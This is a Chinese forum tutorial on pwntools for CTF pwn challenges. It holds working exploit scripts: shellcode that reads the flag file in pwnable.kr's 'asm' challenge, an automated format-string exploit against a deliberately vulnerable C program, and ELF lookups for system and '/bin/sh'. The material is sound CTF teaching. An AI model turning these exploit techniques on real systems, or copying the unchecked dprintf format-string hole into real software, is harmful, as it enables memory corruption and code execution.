@@ -1,0 +1,155 @@
+
+## Pwntools 基础使用
+现在我们重新看回`pwntools`脚本。第一行将`pwntools`提供的工具引入到我们的`python`上下文中。
+
+`remote("一个域名或者ip地址", 端口)`会连接到我们指定的地址及端口。然后该函数会返回`remote`对象（这里，我们将该对象保存到了变量`c`）。`remote`对象主要用来进行对远程主机的输入输出。它有如下几个方法：
+
+- `send(payload)` 发送`payload`
+- `sendline(payload)` 发送`payload`，并进行换行（末尾`\n`）
+- `sendafter(some_string, payload)` 接收到`some_string`后，发送你的`payload`
+- `recvn(N)` 接受`N`（数字）字符
+- `recvline()` 接收一行输出
+- `recvlines(N)` 接收`N`（数字）行输出
+- `recvuntil(some_string)` 接收到`some_string`为止
+
+在第三行中，`p32()`可以让我们转换整数到小端序格式。`p32`转换4字节。`p64`和`p16`则分别转换8 bit 和 2 bit 数字。`c.sendline`将我们的`payload`发送到远程主机。`"AAAA" * 14`是我们到`key`的偏移量。`Pwntools`不能自动运算偏移量，用户需要自行计算。
+
+最后，我们成功`getshell`了。这时，你可能想发送命令进行交互。`c.interactive()`允许我们在终端里将命令传送到远程服务器。`Pwntools`会自动接收输出并回显。
+
+![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_3KDCPDBYDBFWSMH.png)
+
+## 写 Shellcode
+下一题是`pwnable.kr`的`asm`。你需要用`ssh -p2222 asm@pwnable.kr`并输入密码`guest`来查看可执行文件和源码。这里，我们只展示利用代码：
+
+```
+from pwn import *
+
+p = process("./asm")
+
+context.log_level = 'DEBUG'
+
+gdb.attach(p)
+
+context(arch='amd64', os='linux')
+
+shellcode = shellcraft.amd64.pushstr("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
+shellcode += shellcraft.amd64.linux.open('rsp',0,0)
+shellcode += shellcraft.amd64.linux.read('rax','rsp',0)
+shellcode += shellcraft.amd64.linux.write(1, 'rsp', 100)
+
+p.recvuntil('shellcode: ')
+p.send(asm(shellcode))
+log.success(p.recvall())
+```
+
+我们这里用到了新的`api`：`process()`、`contex.log_level`、`gdb.attach`和`shellcraft`。
+
+`process`和`remote`累死。`remote`连接远程主机，`process`则通过你声明的二进制文件路径在本地创建新的进程。除了I/O，`process`返回的对象可以通过`gdb.attach(p)`将进程`attach`到`gdb`上。`Attach`之后，`gdb`便可以调试该程序（设置`breakpoints`，查看`stack`，以及简单的反汇编）。
+
+![图片描述](https://bbs.kanxue.com/upload/attach/201901/3_QGGWTB3XTZ6JTC5.png)
+
+> 提醒一下，如果你想在命令行中使用`gdb.attach()`，便需要安装并运行`tmux`。[更多关于`tmux`的信息](https://bbs.kanxue.com/elink@7f7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Z5j5h3y4C8k6i4u0F1L8$3!0F1i4K6u0W2j5$3!0E0i4K6u0r3j5g2)9J5k6r3N6W2L8Y4c8D9k6g2)9J5k6r3W2F1N6s2u0G2k6s2g2U0N6r3W2G2L8W2)9J5k6s2c8G2i4K6u0V1N6r3#2#2P5q4)9J5k6o6S2V1y4K6R3@1j5K6b7H3y4o6x3@1x3l9`.`.)。
+
+当我们想查看服务器输出时，并不需要在每个`recvline`或者`recvuntil`前加`print`。当`context.log_level`被设置为`"DEBUG"`，我们的输入和服务器的输出会被直接输出。
+
+`shellcraft`是一个帮忙生成`shellcode`的类。在我们的例子中，我们`open`了一个文件并`read`文件到`stdout`。关于这个类更多的文档，你可以查阅[官方文档](https://bbs.kanxue.com/elink@e57K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3c8G2j5%4y4Q4x3X3g2H3N6$3&6@1L8$3!0D9M7#2)9J5k6h3y4G2L8g2)9J5c8X3g2F1i4K6u0r3M7%4c8S2j5X3I4W2i4K6u0r3M7$3S2W2L8r3I4U0M7X3q4X3N6q4)9J5k6h3S2@1L8h3H3`.)。
+
+## 格式化漏洞自动化
+我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：
+
+```
+from pwn import *
+
+import tempfile
+
+program = tempfile.mktemp()
+source  = program + ".c"
+write(source, '''
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#define MEMORY_ADDRESS ((void*)0x11111000)
+#define MEMORY_SIZE 1024
+#define TARGET ((int *) 0x11111110)
+int main(int argc, char const *argv[])
+{
+       char buff[1024];
+       void *ptr = NULL;
+       int *my_var = TARGET;
+       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
+       if(ptr != MEMORY_ADDRESS)
+       {
+               perror("mmap");
+               return EXIT_FAILURE;
+       }
+       *my_var = 0x41414141;
+       write(1, &my_var, sizeof(int *));
+       scanf("%s", buff);
+       dprintf(2, buff);
+       write(1, my_var, sizeof(int));
+       return 0;
+}''')
+cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
+process(cmdline).wait_for_close()
+def exec_fmt(payload):
+    p = process(program)
+    p.sendline(payload)
+    return p.recvall()
+
+autofmt = FmtStr(exec_fmt)
+offset = autofmt.offset
+p = process(program, stderr=PIPE)
+addr = u32(p.recv(4))
+payload = fmtstr_payload(offset, {addr: 0x1337babe})
+p.sendline(payload)
+print hex(unpack(p.recv(4)))
+```
+
+有了`FmtStr`，我们不用算偏移量算到疯。我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数。接着，我们可以得到`autofmt`。这个对象包含`offset`，即算好的偏移量。`fmtstr_payload(offset, {address: value})`帮我们生成最后的`payload`。第一个参数`offset`用`autofmt.offset`算好的即可。然后，我们需要声明`{address: value}`来覆盖`address`的内容成对应的`value`。我们还可以同时改写多个地址：`{address1: value1, address2:value2,..., address: valueN}`。
+
+有些情况不能自动生成`payload`。以下文档介绍了如何手动生成`payload` [fmtstr_payload](https://bbs.kanxue.com/elink@2f1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3c8G2j5%4y4Q4x3X3g2H3N6$3&6@1L8$3!0D9M7#2)9J5k6h3y4G2L8g2)9J5c8X3g2F1i4K6u0r3M7%4c8S2j5X3I4W2i4K6u0r3k6X3#2@1M7%4c8J5i4K6u0W2K9s2c8E0L8q4)9J5x3%4m8%4L8X3I4A6j5W2)9J5k6h3k6E0N6s2y4@1M7W2)9J5k6h3k6E0N6s2y4@1M7W2)9#2k6Y4m8S2P5h3I4G2j5h3b7`.)。
+
+## 使用 ELF()
+有些题目给了我们`libc`。用`gdb> x function1 — function2`算偏移量太麻烦了，因此有了`ELF`。
+
+```
+from pwn import *
+
+e = ELF('./example_file')
+print hex(e.address)  # 0x400000
+print hex(e.symbols['write']) # 0x401680
+print hex(e.got['write']) # 0x60b070
+print hex(e.plt['write']) # 0x401680
+offset = e.symbols['system'] - e.symbols['printf'] # calculate offset
+binsh_address = next(e.search('/bin/sh\x00')) # find address which contains /bin/sh
+```
+
+和`process()`一样，我们只用将路径给`ELF(path)`即可分析`ELF`。
+
+我们有以下几种方法操纵`ELF`：
+
+- `symbols['a_function']` 找到`a_function`的地址
+- `got['a_function']` 找到`a_function`的`got`
+- `plt['a_function']` 找到`a_function`的`plt`
+- `next(e.search("some_characters"))` 找到包含`some_characters`（字符串，汇编代码或者某个数值）的地址。
+
+# 总结
+`Pwntools`是一套十分强大的工具。在本文中，我介绍了最常用的几个`api`，但`pwntools`还有很多其他强大的`api`，诸如`qemu`、`adb`。各位可通过官方文档进行剩余的学习
+
+文章就到这里了，第一次发贴orz，略略水，请各位大佬见谅。
+
+我的[blog: 6b3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4#2P5s2W2Q4x3X3g2^5P5i4Z5`.](https://bbs.kanxue.com/elink@309K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4#2P5s2W2Q4x3X3g2^5P5i4A6Q4x3V1j5`.)会有略略高级的writeup，主攻`pwn`和`web`。博客为英文，不过还是希望大佬们捧捧场qaq。
+
+[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
+
+最后于  2019-1-30 13:20
+
+被`admin`编辑，原因：
+
+上传的附件：
+
+- [bof](javascript:void(0);)
+  （7.18kb，100次下载）
+- [asm](javascript:void(0);)
+  （13.38kb，88次下载）
